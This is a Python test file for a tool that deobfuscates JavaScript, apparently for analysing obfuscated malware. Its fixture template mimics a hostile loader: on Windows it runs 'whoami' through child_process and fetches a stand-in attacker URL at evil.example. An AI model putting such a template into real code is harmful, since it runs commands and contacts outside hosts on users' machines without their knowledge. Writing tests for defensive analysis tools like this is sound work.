import pytest

from tools.common import deobf
from tools.tests.obfio import obfuscate

USES = {"os": "os", "platform": "platform", "win": "win32", "cp": "child_process", "cmd": "whoami",
        "url": "https://evil.example/x"}
TEMPLATE = ("const os=require({os});\n"
            "if(os[{platform}]()==={win}){{require({cp}).exec({cmd});fetch({url});}}\n")


@pytest.mark.parametrize("variant", ["none", "base64", "rc4"])
def test_round_trip(variant):
    src = obfuscate(USES, TEMPLATE, variant=variant, rotation=7).encode()
    out, params, stats = deobf.derive(src)
    text = out.decode()
    assert 'const os=require("os");' in text
    assert 'if(os["platform"]()==="win32"){require("child_process").exec("whoami");' in text
    assert params["variant"] == variant and params["rotations"] == 7 and params["offset"] == 0x1b3
    assert stats["unresolved"] == 0 and stats["substituted"] >= len(USES)


def test_derivation_is_reproducible():
    src = obfuscate(USES, TEMPLATE, variant="base64").encode()
    assert deobf.derive(src) == deobf.derive(src)


def test_a_checksum_that_never_matches_is_not_decoded():
    src = obfuscate(USES, TEMPLATE).replace("if(_0xs===_0xt)", "if(_0xs===_0xt+1)")
    broken = src.replace("(_0xp,0x", "(_0xp,0x1")  # a target no rotation reaches
    assert deobf.derive(broken.encode()) is None


def test_checksum_interpreter_refuses_other_code():
    src = obfuscate(USES, TEMPLATE).replace("parseInt(_0xc(", "eval(_0xc(", 1)
    assert deobf.derive(src.encode()) is None


def test_plain_code_is_left_alone():
    assert deobf.derive(b"const a = ['x', 'y']; console.log(a);") is None
